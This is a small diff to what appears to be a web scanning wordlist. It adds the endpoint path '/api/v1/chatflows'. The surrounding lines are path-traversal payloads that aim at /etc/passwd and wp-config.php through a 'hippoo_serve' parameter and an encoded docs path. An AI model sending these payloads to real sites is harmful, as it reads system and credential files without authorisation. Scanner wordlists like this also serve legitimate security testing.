@@ -728,3 +728,4 @@
 /?hippoo_serve=../../../../../../../etc/passwd
 /?hippoo_serve=../../../../wp-config.php
 /workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/api/v1/chatflows
